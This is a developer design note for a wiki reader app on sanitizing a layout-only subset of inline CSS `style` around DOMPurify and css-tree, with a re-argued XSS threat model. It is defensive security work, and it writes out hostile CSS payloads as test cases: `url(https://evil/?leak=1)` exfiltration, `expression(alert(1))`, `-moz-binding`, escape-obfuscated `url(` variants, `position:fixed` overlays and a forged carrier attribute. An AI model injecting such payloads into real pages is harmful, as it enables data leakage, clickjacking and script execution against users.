# Discovery spike — layout-only inline-`style` subset: sanitization mechanism + X4 re-proof (#106)

**Status:** Complete — **VIABLE**. **Role:** Development (discovery spike). **Gates:** the UX + Dev
stages of #106. **Input read:** `docs/specs/inline-style-subset.md` (AC1–AC13), `lib/wiki/cssScope.ts`
(#105's `css-tree` value sanitizer — the reused primitive), `lib/wiki/article.ts` (the DOMPurify config,
the `uponSanitizeAttribute` inert-attr hook, the custom `ALLOWED_URI_REGEXP`), the existing inline-`style`
X4 tests (`test/article-fidelity.test.ts` ~L419, `test/article-fidelity-xss.test.ts` ~L101,
`test/article-fidelity-hook-xss.test.ts` ~L57/L139), `docs/design/templatestyles-reuse-spike.md` (#105),
and the live Parsoid markup of `Cat` and `San Francisco`.

This spike **picks the inline-`style` sanitization mechanism** and **re-argues the X4 threat model** for
the re-opened inline-`style` boundary. It does **not** implement the feature. Every claim below was
validated in a throwaway harness against **DOMPurify 3.4.10**, **`css-tree` 3.2.1**, **jsdom 25**, and the
**real** `Cat`/`San Francisco` montage markup fetched from the REST `page/html` endpoint.

---

## 1. Verdict

**VIABLE.** A layout-only subset of inline `style` can be recovered without re-opening X4, by:

1. a **pre-DOMPurify "encode" pass** that, on a throwaway parse of the raw Parsoid HTML, runs each
   element's `style` attribute through a **shared declaration-level sanitizer extracted from #105's
   `cssScope.ts`** (property allowlist + reused value sanitizer), and re-emits the surviving allowlisted
   subset onto an **inert carrier attribute** (`data-wikiplus-style`) — dropping the original `style`;
2. the **unchanged DOMPurify pass** (`style` stays out of `ALLOWED_ATTR`; the carrier rides through as an
   inert `data-*` attribute), with the **existing `uponSanitizeAttribute` hook extended** to also
   `forceKeepAttr` the **img `width`/`height` presentational attributes** (needed for montage tiling);
3. a **post-DOMPurify "decode" pass** over the clean DOM that renames `data-wikiplus-style` → `style`.

The fallback gate (spec §6.3) is **not** triggered: AC5–AC9 are re-provable for inline `style`. The
montage tiling (#91), per-cell colors (#93), and taxon-band color (#74's partial) all render from the
recovered allowlisted subset.

**No new dependency.** This reuses `css-tree` (already a #105 `dependencies` entry) and adds no parser.

### Why NOT the `uponSanitizeAttribute` in-place mechanism (the headline mechanism finding)

The spec offered two candidates: (a) extend `uponSanitizeAttribute` to sanitize `style` in-place, vs.
(b) a post-DOMPurify DOM pass. **Candidate (a) is impossible with DOMPurify 3.4.10** and this is the
decisive finding of the spike:

- **`uponSanitizeAttribute` never fires for the `style` attribute** — measured directly: with `style` in
  `ALLOWED_ATTR` and a hook that logs every `(node, attrName)` it sees, the hook's observed list contains
  **no `style` entry at all**, and the output `style` is gone. DOMPurify 3.x special-cases `style` and
  removes it during its own attribute scrub **before** the per-attribute hook is invoked, regardless of
  the allowlist. Mutating `data.attrValue`/`data.forceKeepAttr` for `style` in the hook is therefore a
  no-op — the callback is never reached for that attribute.
- **`uponSanitizeElement` also does not expose a readable `style`** in this path — by the time the element
  hook runs in jsdom the attribute is already gone, so it cannot be captured there either.

So the only place the **raw `style` bytes** are still available is **before** DOMPurify runs. That forces
the encode/decode shape: sanitize `style` on a pre-sanitize parse, carry the safe subset through DOMPurify
as inert data, restore it after. (Pure "candidate (b)" — a post-pass over the clean DOM alone — cannot
work either, because the clean DOM no longer has any `style` to read. The post-pass is real, but it only
*renames the carrier*; the *sanitization* happens in the pre-pass where the raw value still exists.)

This mechanism keeps the X4-critical value logic in **one shared, auditable copy** (the extracted
`cssScope.ts` declaration sanitizer), and leaves the DOMPurify HTML/attribute boundary, the custom
`ALLOWED_URI_REGEXP`, and the inert-attr hook's `finally` removal exactly as #105/#74 left them.

---

## 2. The chosen mechanism — precise rules

A new pure function — `sanitizeInlineStyle(styleAttr: string): string` — built on the shared declaration
sanitizer (§6), takes one element's raw `style` attribute value and returns the cleaned, allowlisted,
value-sanitized subset (or `""` if nothing survives). It threads into `fetchFullArticle` as three small
steps around the **unchanged** DOMPurify call.

### 2.1 Pre-DOMPurify encode pass (runs on the raw Parsoid HTML)

This mirrors how `collectStyleCss` already reads `<style>` text from a throwaway parse of the raw HTML
*before* the DOMPurify pass — same pattern, same safety basis (a detached `DOMParser` document executes
no styles/scripts; we only read string attributes).

On a throwaway `DOMParser` parse of the raw HTML, for the article root:

1. **Strip any attacker-supplied carrier first.** `for (el of root.querySelectorAll("[data-wikiplus-style]")) el.removeAttribute("data-wikiplus-style")`.
   This is **load-bearing for X4** (§4, HIJACK): the carrier name must only ever hold *our* sanitized
   output, never a value the source HTML chose. Without this strip, fetched HTML carrying its own
   `data-wikiplus-style="position:fixed;background-color:url(//evil)"` would sail through as inert data and
   be promoted to a live `style` by the decode pass. With the strip, it dies.
2. For each `el` in `root.querySelectorAll("[style]")`:
   - `const cleaned = sanitizeInlineStyle(el.getAttribute("style") || "")` — **read the raw attribute**,
     never `el.style.cssText` (see §4, the jsdom decode gap).
   - `el.removeAttribute("style")` — the original `style` is dropped unconditionally.
   - `if (cleaned) el.setAttribute("data-wikiplus-style", cleaned)` — only the safe subset rides forward.

The encoded HTML string (`root.innerHTML`) is what feeds DOMPurify.

### 2.2 DOMPurify pass (unchanged config + one hook extension)

- `style` **stays out of `ALLOWED_ATTR`** (X4 boundary for inline `style` is unchanged at the DOMPurify
  layer — a literal `style` that somehow reached DOMPurify is still dropped).
- `data-wikiplus-style` rides through as an inert `data-*` attribute (DOMPurify keeps `data-*` by default
  via `ALLOW_DATA_ATTR`; a `data-*` value is inert text, never a URL/markup context — the existing
  hook-XSS test already asserts a hostile `data-*` value stays inert plain text).
- The existing `uponSanitizeAttribute` hook (added then removed in `finally`) is **extended** to also
  `forceKeepAttr` the **img `width`/`height`** attributes (§3). Its `KEEP_INERT_ATTRS` set
  (`colspan`/`rowspan`/`scope`) is unchanged; the addition is gated on `node.tagName === "IMG"` so it
  only rescues dimensions on images. The hook still rescues **nothing else** and is still removed in
  `finally`, so the shared DOMPurify singleton gains no persistent state.

### 2.3 Post-DOMPurify decode pass (runs on the clean DOM, in `fetchFullArticle`)

After `DOMParser.parseFromString(clean, …)` produces `root` (where the existing `stripChrome`/`rewriteLinks`/
… passes run), add one pass — ordered **before** the layout-consuming passes (`prepClades`/`wrapTables`)
so they see the recovered geometry:

```
for (el of root.querySelectorAll("[data-wikiplus-style]")) {
  el.setAttribute("style", el.getAttribute("data-wikiplus-style"));
  el.removeAttribute("data-wikiplus-style");
}
```

The value written to `style` here is **only ever** the css-tree-sanitized, allowlist-filtered string the
pre-pass produced — every byte was re-serialized by `css-tree`'s `generate`, so it cannot contain markup,
a banned function token, a non-allowlisted property, or `position`.

### 2.4 The shared declaration sanitizer (`sanitizeInlineStyle`)

```
parse(styleAttr, { context: "declarationList", parseValue: true, onParseError() {} })
  → walk Declaration:
      prop = decodeIdent(node.property).toLowerCase()      // DECODED name
      if (!INLINE_ALLOW.has(prop)) skip                    // property allowlist (AC5)
      rawValue = generate(node.value)
      if (!valueIsDeclarationSafe(rawValue)) skip          // reused #105 value sanitizer (AC6/AC8/AC9)
      keep `${prop}:${rawValue}`                            // re-emit with the DECODED canonical name
  → join("; ");  // "" if nothing survived → caller drops the attribute (AC4/AC5)
  → wrap the whole walk in try/catch → "" on any throw (fail closed)
```

`parse(..., { context: "declarationList" })` parses a `style`-attribute body (a `;`-separated declaration
list, no selector), the correct css-tree context for an inline style. Re-emitting with the **decoded**
property name (not the raw escaped literal) means an escaped-but-allowed name like `\62 ackground-color`
becomes the canonical `background-color` — it cannot carry a second hidden meaning into the browser.

---

## 3. The img `width`/`height` sub-decision — REQUIRED, via the hook

**Decision: restore the img `width`/`height` *presentational attributes* (not inline style), via the
existing `uponSanitizeAttribute` hook, and it is necessary.**

The real `Cat`/`San Francisco` montage markup settles this. A `.tmulti` montage is:

```
<div class="multiimageinner" style="width:267px;max-width:267px;border:none">
  <div class="trow">
    <div class="tsingle" style="width:183px;max-width:183px">
      <div style="height:110px;overflow:hidden">
        <span typeof="mw:File"><a …>
          <img … height="111" width="181" class="mw-file-element" />
        </a></span>
      </div>
    </div>
    …
  </div>
</div>
```

The per-image **scaled display size is on the `<img>`'s `width`/`height` *attributes*** (`width="181"
height="111"`), **not** in any inline `style`. The `.tsingle` inline style sets the *column* width; the
crop `<div style="height:110px;overflow:hidden">` sets the *uniform crop* height; the `<img>` attributes
set the *image* render size that the crop clips. All three are needed to tile faithfully:

- **`.tsingle` width/max-width** → the side-by-side column widths (so the flex row from #105 has something
  to size against instead of collapsing to a full-width stack).
- **crop `height` + `overflow:hidden`** → the uniform crop band.
- **`<img>` width/height attributes** → the image's scaled size *inside* the crop. Without them, DOMPurify
  3.x **drops `width`/`height`**: they are listed in `ALLOWED_ATTR` but the custom `ALLOWED_URI_REGEXP`
  URI-validates the values (`"181"`/`"111"` fail the link regexp) and removes them — the *same* mechanism
  that drops `colspan`/`rowspan`/`scope` until the hook re-permits them. Measured: with no hook the output
  `<img>` is `<img src=… alt=…>` (dimensions gone); with the `IMG`-gated hook extension both survive.

`width`/`height` on `<img>` are **inert presentational attributes** — they accept only a length/number,
carry no URL, script, or style, and are not promoted to any live handler. Re-permitting exactly these two,
gated on `IMG`, does not weaken the URI validation that drops other attribute values (it is the identical
`forceKeepAttr` mechanism #74 already uses for three other inert attributes, removed in `finally`).

**Minimal sufficient set for faithful montage tiling:** the inline subset `{ width, max-width, height,
overflow, border }` on the montage wrappers **plus** the img `{ width, height }` presentational
attributes. Both are required; neither alone tiles.

---

## 4. The property allowlist — confirmed minimal sufficient set

```
width, max-width, height, overflow,            // montage tiling (.tsingle/.multiimageinner) + crop
background-color, color,                        // per-cell colors (#93) + taxon band (#74)
text-align, vertical-align,                     // cell/banner alignment (taxobox, montage caption)
border, border-top, border-right,               // montage `border:none`, faithful cell rules
border-bottom, border-left,
border-width, border-style, border-color
```

`position` is **NEVER** allowlisted inline (spec A3), even `relative`/`static` — stricter than #105's
block path (which keeps `position:relative` for `td.clade-bar`), because the inline surface is
attacker-reachable on **any** element.

**Justification per property, against the real markup:**

| Property | Needed for | Evidence |
|---|---|---|
| `width`, `max-width` | `.tsingle style="width:183px;max-width:183px"`, `.multiimageinner style="width:267px;max-width:267px"`, taxobox `width:200px` | live Cat/SF `.tsingle`; TAXOBOX fixture |
| `height`, `overflow` | crop `<div style="height:110px;overflow:hidden">` | live Cat/SF crop div |
| `border`/`border-*` | `.multiimageinner style="…;border:none"`; faithful per-cell rules | live Cat/SF `multiimageinner` |
| `background-color` | per-cell colors (#93); taxon band `background-color:rgb(180,250,180)` (#74/AC3) | TAXOBOX fixture th |
| `color` | text color Wikipedia pairs with a cell `background-color` (AC2) | spec AC2 |
| `text-align` | montage caption + taxobox banner/cell centering (`text-align:center`) | live `.tmulti`; TAXOBOX fixture |
| `vertical-align` | table-cell vertical alignment in styled data tables | spec §3.1 candidate; common cell layout |

**Tightening note (for Dev/QA):** every candidate property in spec §3.1 is retained — each maps to a
concrete fidelity case above, so none is dropped. The set is the candidate set unchanged; the spike
confirms it is *sufficient* (montage + colors + band all render) and that **nothing beyond it is needed**
(no `display`, `float`, `margin`, `padding`, `position`, `z-index`, `content`, `background` shorthand,
custom properties, etc.) — those stay dropped, shrinking the surface. Adding any property later requires
re-arguing X4 for it (spec A2).

---

## 5. X4 re-argument for the inline-`style` boundary (the release gate)

The boundary is the **property allowlist + the reused #105 value sanitizer + the carrier strip + the
`css-tree` re-emit**. Each X4 AC maps to the rule that meets it; all were validated through the full
pipeline (pre-encode → DOMPurify → post-decode).

- **AC5 — Property allowlist is the boundary.** `sanitizeInlineStyle` keeps a declaration **only** if its
  decoded property name is in `INLINE_ALLOW`; everything else is dropped, and an all-non-allowlisted
  `style` yields `""` → the caller writes no `data-wikiplus-style`, so the decoded element has **no**
  `style`. Verified: `style="background-color:#eee; behavior:url(x); content:'…'; z-index:99;
  position:fixed"` → only `background-color` is a candidate (and here it survives; the rest drop);
  `style="z-index:5; content:'x'"` → no `style` attribute at all.

- **AC6 — No `url()`/`image-set()` exfiltration via a kept value.** Each kept declaration's value runs
  through the reused `valueHasBadFnToken` + `BAD_VALUE_FN` textual scan; any `url(`/`image-set(`/
  `-webkit-image-set(`/`-moz-element(`/`expression(` token drops the **whole declaration**. Verified:
  `background-color:url(https://evil/?leak=1)` → dropped; `width:image-set(url(//evil/a) 1x)` → dropped;
  `border:1px solid url(//evil)` → dropped (even though `border` is allowlisted, the value carries
  `url()`). No surviving declaration can issue a network request.

- **AC7 — No off-column overlay / clickjack via `position`.** `position` is **not in `INLINE_ALLOW`**, so
  every `position` declaration (`fixed`/`absolute`/`sticky`/`relative`/`static`) is dropped by the property
  filter — stricter than the block path. Verified: all three of `position:relative|absolute|sticky` →
  dropped. No inline-styled element can leave normal flow to overlay the ＋plus rail/header/player modal/TOC.

- **AC8-X4 — No script execution via `behavior`/`expression()`/`-moz-binding`.** Defense in depth: the
  properties `behavior`/`-moz-binding`/`binding` are non-allowlisted (dropped by the property filter)
  **and** their values carry banned function tokens (dropped by the value scan); `expression(...)` is a
  banned value token **and** appears only in non-allowlisted properties. Verified: `behavior:url(#x)`,
  `-moz-binding:url(evil.xml)`, `width:expression(alert(1))`, and `width: EXPRESSION (alert(1))` (cased +
  spaced) → all dropped.

- **AC9 — Escape/comment/whitespace obfuscation is decoded, not smuggled.** Property names are compared on
  their **decoded** form (`decodeIdent`) and values are scanned both textually (comment-stripped,
  whitespace-collapsed) and at the token level (each function token decoded). Verified: `po\73 ition:fixed`
  → the property decodes to `position` → dropped (and a co-located benign `background-color:#abc` is kept);
  `background-color:\75 rl(//evil)`, `background-color:u/**/rl(//evil)`, `width:ur\6c(//evil)` → all dropped;
  `\62 ackground-color:#abc` → decodes to `background-color`, kept and **re-emitted with the decoded name**
  (no hidden second meaning). An un-tokenizable value fails closed inside `valueHasBadFnToken`'s `catch`.

**The jsdom-vs-real-browser decode gap (the #105 lesson, applied to the inline path).** The pre-pass reads
`el.getAttribute("style")`, which returns the **raw literal bytes** — escapes and `/* */` comments
preserved — confirmed in jsdom for the whole obfuscation battery. It does **not** read
`el.style.cssText`, which is CSSOM-laundered (e.g. it silently *drops* `behavior`/`expression`, which
would hide the threat the wrong way, and reorders/normalizes the rest). Decoding therefore happens in
`css-tree` exactly as in the block path, on the same bytes a real browser tokenizes — the test harness
must assert the **decoded** outcome, not jsdom's CSSOM view.

**The carrier-hijack vector and its defense (a finding unique to this mechanism).** Because the safe subset
is carried on `data-wikiplus-style` through DOMPurify, fetched HTML that supplies its own
`data-wikiplus-style` would otherwise be promoted to a live `style` by the decode pass. The pre-pass
**strips every `data-wikiplus-style` before re-deriving it from real `style`** (§2.1 step 1), so the
carrier only ever holds our sanitized output. Verified: `<div data-wikiplus-style="position:fixed;
background-color:url(//evil)">` and `<div data-wikiplus-style="width:9px" style="position:fixed">` both
decode to `<div>` with **no** `style`. QA must include this as an explicit X4 case — it is the new surface
this mechanism introduces.

**No regression to the existing boundaries (AC13).** The DOMPurify `ALLOWED_TAGS`/`ALLOWED_ATTR`/custom
`ALLOWED_URI_REGEXP` are unchanged; `style` stays out of `ALLOWED_ATTR`; the inert-attr hook still rescues
only its hardcoded set plus img `width`/`height` (gated on `IMG`) and is still removed in `finally`
(verified no singleton leak: a subsequent independent sanitize without the hook still drops
`colspan`/`scope`/`style`/`on*`). The #105 block path and its CSS-block X4 re-proof are untouched (this
spec adds no `<style>` handling). `<script>`/`<style>`/`<math>`/`<svg>`/event handlers/`javascript:` URIs
all still die.

---

## 6. Shared-sanitizer refactor plan (what to extract from `cssScope.ts`)

The cleanest design factors **one declaration-level value sanitizer** that both the block path
(`scopeArticleCss`) and the new inline path (`sanitizeInlineStyle`) call — so the inline boundary inherits
#105's escape-obfuscation defenses for free and there is **one auditable copy** of the X4 value logic.

**Extract from `lib/wiki/cssScope.ts` into a shared module** (e.g. keep it in `cssScope.ts` and export, or
a small `lib/wiki/cssDeclSafety.ts` that `cssScope.ts` imports — Dev's call at implement time):

- the constants `BAD_VALUE_FN`, `BAD_VALUE_BEHAVIOR`, `BAD_FN_NAMES`;
- the `normIdent` helper (`decodeIdent(...).toLowerCase()`);
- the `valueHasBadFnToken(value)` token-level decoded scan;
- a new combined predicate `valueIsDeclarationSafe(rawValue): boolean` that runs the comment-strip +
  whitespace-collapse textual scan (`BAD_VALUE_FN`/`BAD_VALUE_BEHAVIOR`) **and** `valueHasBadFnToken`,
  returning `false` if any fires — i.e. the exact value-drop condition currently inlined in
  `scopeArticleCss`'s Pass-2 `Declaration` walker.

`scopeArticleCss` then calls `valueIsDeclarationSafe` in its declaration pass instead of the inline
expression (behavior-preserving — the block path keeps its own `position` rule with the block-path
semantics: `relative`/`static` allowed there). `sanitizeInlineStyle` calls the **same**
`valueIsDeclarationSafe`, and layers on top the **inline-only** rules: the property allowlist and the
**total** `position` drop (no value exception). The lazy-import shape stays identical — both paths
`await import` the lexer-free `css-tree/parser`·`/generator`·`/walker`·`/tokenizer`·`/utils` subpaths, so
no `mdn-data` enters the bundle and the code stays off the no-article paths.

**The two paths differ only in their *property* policy, sharing the *value* policy:**

| | Block path (`scopeArticleCss`) | Inline path (`sanitizeInlineStyle`) |
|---|---|---|
| Property gate | drop-list (`behavior`/`-moz-binding`/`binding`) | **allowlist** (`INLINE_ALLOW`) |
| `position` | drop `fixed`/`absolute`/`sticky` only | drop **all** values |
| Value safety | `valueIsDeclarationSafe` (shared) | `valueIsDeclarationSafe` (shared) |
| Application | `<style>` `textContent` | `style` attribute via carrier rename |

---

## 7. Fidelity confirmation (AC1–AC4)

Validated through the full pipeline on the real markup:

- **AC1 — `.tmulti` montages tile.** Recovering `{ width, max-width, height, overflow, border }` on
  `.multiimageinner`/`.tsingle`/crop **plus** the img `{ width, height }` attributes reproduces the exact
  geometry: the #105 `.trow{display:flex}` scaffold now sizes against per-column `.tsingle` widths, each
  image renders at its scaled `width`/`height` inside a `height:…;overflow:hidden` crop band → side-by-side,
  uniformly cropped, instead of a full-width stack. Pipeline output preserves the full Cat chain intact.
  (QA verifies AC1 **live** on the deployed Cat/SF pages at ~1366px and ~768px — the spike confirms the
  data survives sanitize; the rendered result is QA's live gate.)
- **AC2 — Per-cell colored backgrounds.** `background-color:#…`/`rgb(…)` (and paired `color`) survive
  sanitized and scoped to their own cell; the `background` *shorthand* (which could carry `url()`) is
  **not** allowlisted, so only the explicit `background-color` longhand is recoverable — the safe subset.
- **AC3 — Taxon-band color.** The taxobox banner `<th style="…;background-color:rgb(180,250,180)">`
  survives sanitized (a hex/rgb color carries no `url()`/`position`/banned token). This **recovers #74's
  accepted-partial neutral grey** — subject to AC10's AA darken-to-pass policy, which UX/Dev own; the
  band's structural signal (centered/bold/hairline) is independent of the color.
- **AC4 — No regression where style is dropped.** An element whose `style` is entirely non-allowlisted or
  sanitized-away yields no `data-wikiplus-style`, so the decoded element has **no** `style` attribute —
  identical to today. Verified: `style="z-index:5; content:'x'"` → `<div>`.

**Fidelity verdict: montage tiling ✔, per-cell colors ✔, taxon band ✔ — all reachable from the
allowlisted inline subset + the img dimension attributes, with no relaxation of the value sanitizer.**

---

## 8. Risks / notes for Dev & QA

1. **Pass ordering.** The decode pass (§2.3) must run **before** `prepClades`/`wrapTables` (and any pass
   that reads geometry), and after `stripChrome` (so chrome with a forged carrier is gone first). It is
   additive to the existing pass order; it does not change `stripChrome`'s removal list (the
   `#Timeline-row` timebar still goes — its layout needs `position:absolute`, which the allowlist blocks).
2. **Carrier-strip is mandatory and first** (§2.1 step 1 / §5 HIJACK). Make it an explicit X4 test.
3. **Read `getAttribute("style")`, never `el.style.cssText`** (§5 decode gap). A test should feed an
   escaped/comment-obfuscated payload and assert the **decoded** outcome.
4. **Tolerant parse re-serializes malformed values inertly, not "fails closed" in the strict sense.** A
   value like `width:calc( ( (` is re-emitted by `css-tree` as a balanced-but-invalid `calc((()))` and
   kept on an allowlisted property. This is **not** an X4 leak — an invalid length issues no request, runs
   no script, and a malformed `calc` simply has no effect — but it is *not* literally "the declaration is
   dropped" as AC9's prose suggests. Dev should decide whether to additionally drop a declaration whose
   re-serialized value fails a strict length/color grammar check (a fidelity/tidiness nicety), and QA
   should treat AC9's "fail closed" as satisfied by *inertness*, not necessarily *absence*. Flagged so it
   is a conscious decision, not a silent gap.
5. **`var(--x)` on an allowlisted property survives but resolves to nothing.** `color:var(--evil)` is kept
   (no banned token), but the `--evil` custom-property declaration is dropped (not allowlisted), so it
   resolves to the initial value — inert, no exfil (a `var()` cannot fetch). Harmless; noted so QA does not
   mistake a surviving `var()` for a leak. Dev may additionally drop values containing `var(` for tidiness.
6. **Revise, do not delete, the existing inline-`style` X4 tests** (spec §8): `article-fidelity.test.ts`
   ~L419 (band color + `width` now survive *sanitized*; `url`/`position`/`behavior`/obfuscated still die),
   `article-fidelity-xss.test.ts` ~L101 (the `url(javascript:…)` value must still die; add a positive
   `background-color:#…` keep case), `article-fidelity-hook-xss.test.ts` ~L57/L139 (the `position:fixed`/
   `on*`/`javascript:` on a banner `<th>` must still die; `colspan`/`scope` still survive; no singleton
   leak). The payloads stay; only the expected *shape* of the surviving `style` changes from "nothing" to
   "the sanitized layout-only subset."
7. **No new dependency / no bundle regression.** Reuses `css-tree` via the existing lexer-free subpath
   imports; no `mdn-data`. The pre-pass adds one throwaway `DOMParser` parse of the raw HTML (the same
   pattern `collectStyleCss` already pays) — negligible and only on the article path.

---

## 9. Drafted current-state addition for `docs/ARCHITECTURE.md` "DOMPurify allowlist" entry

> **For the implementation Dev to paste** as a new bullet in the "DOMPurify allowlist" entry, alongside the
> existing "TemplateStyles reuse mechanism (#105)" and "Infobox + taxobox internal layout" bullets. It
> supersedes the standing **"`style` stays disallowed" / "Taxon-band color stays neutral grey"** statements
> in those two bullets (update them to point here). Current-state voice, no history cruft.

- **Layout-only inline-`style` subset (allowlist + reused value sanitizer; #106):** Wikipedia ships
  per-element layout/color that no stylesheet carries — montage tiling (`.tmulti`/`.multiimageinner`/
  `.tsingle` widths + the per-image crop `height`/`overflow`), per-cell table `background-color`, and the
  taxobox taxon-band color (`{{Taxobox colour}}`) — as **inline `style`**. A tightly-bounded, layout-only
  subset of inline `style` is recovered while the inline-`style` XSS surface stays closed. The boundary is
  a **property allowlist** — `width`, `max-width`, `height`, `overflow`, `background-color`, `color`,
  `text-align`, `vertical-align`, `border`/`border-*` — combined with the **same css-tree value sanitizer
  the `<style>`-block path uses** (`lib/wiki/cssScope.ts`: escape-decode every property name + value, drop
  any declaration whose value carries a `url(`/`image-set(`/`expression(`/`-moz-element(`/`behavior` token,
  via a textual comment-stripped scan and a token-level decoded scan). `position` is **never** allowlisted
  inline (any value, including `relative`) — stricter than the block path — so no inline-styled element can
  leave normal flow to overlay wiki+ chrome. Because DOMPurify 3.x strips the `style` attribute before any
  `uponSanitizeAttribute`/`uponSanitizeElement` hook can observe it, the subset is recovered around the
  unchanged DOMPurify pass: a **pre-sanitize pass** (on the throwaway raw-HTML parse that already reads the
  `<style>` blocks) first removes any source-supplied `data-wikiplus-style` carrier, then runs each
  element's raw `style` through the sanitizer and re-emits only the surviving allowlisted subset onto an
  inert `data-wikiplus-style` attribute (the original `style` is dropped); DOMPurify keeps that inert
  `data-*` (with `style` still out of `ALLOWED_ATTR`); a **post-sanitize pass** renames
  `data-wikiplus-style` back to `style` on the clean DOM. The faithful **montage image's scaled display
  size** rides on the `<img>`'s inert `width`/`height` **presentational attributes**, re-permitted by the
  same inert-attr `uponSanitizeAttribute` hook that keeps `colspan`/`rowspan`/`scope` (gated on `IMG`,
  removed in `finally`) — DOMPurify otherwise URI-validates those numeric values away under the custom
  `ALLOWED_URI_REGEXP`. The HTML/attribute boundary, the custom `ALLOWED_URI_REGEXP`, and the hook's
  `finally` removal are otherwise unchanged, and the shared DOMPurify singleton gains no persistent state.
  Recovered colors are the faithful Wikipedia values, **AA-darkened to pass** where a cell/band color would
  fail contrast in the article column (never color alone; the band's centered/bold/hairline structure
  carries the signal in greyscale); no Indigo Press color enters the article column. `position`-dependent
  graphics stay out: the geologic `#Timeline-row` timebar is still removed by `stripChrome`, and #92
  pushpin locator-map overlays remain an accepted limit (they need `position:absolute`).

---

## 10. What QA must verify against this spike (security-gate handles)

- **AC5:** mixed allowlisted/non-allowlisted `style` keeps only the allowlisted subset; all-non-allowlisted
  → no `style` attribute.
- **AC6:** `url()`/`image-set()`/`-moz-element()` in **any** allowlisted property's value → declaration
  dropped, no request.
- **AC7:** `position:fixed|absolute|sticky|relative|static` → all dropped; rail/header pixel-unchanged.
- **AC8-X4:** `behavior`/`expression()`/`-moz-binding` → dropped; no script.
- **AC9:** escaped property names (`po\73 ition`), escaped/comment-split function names (`\75 rl(`,
  `u/**/rl(`), and escaped-benign names (`\62 ackground-color`) → assert the **decoded** outcome.
- **Carrier-hijack (new surface):** source HTML supplying its own `data-wikiplus-style` (alone, or with a
  hostile real `style`) → decoded element has **no** `style`.
- **Singleton no-leak:** an independent sanitize after a `fetchFullArticle` call still drops
  `colspan`/`scope`/`style`/`on*` and does not keep img `width`/`height` without the hook.
- **Fidelity:** AC1 montage tiling **live** on Cat + San Francisco (desktop + narrow); AC2 per-cell color;
  AC3 taxon band (AA-adjusted); AC4 no-op where style is fully dropped.
- **No bundle regression:** no `mdn-data` pulled in; reuses the existing css-tree subpath imports.
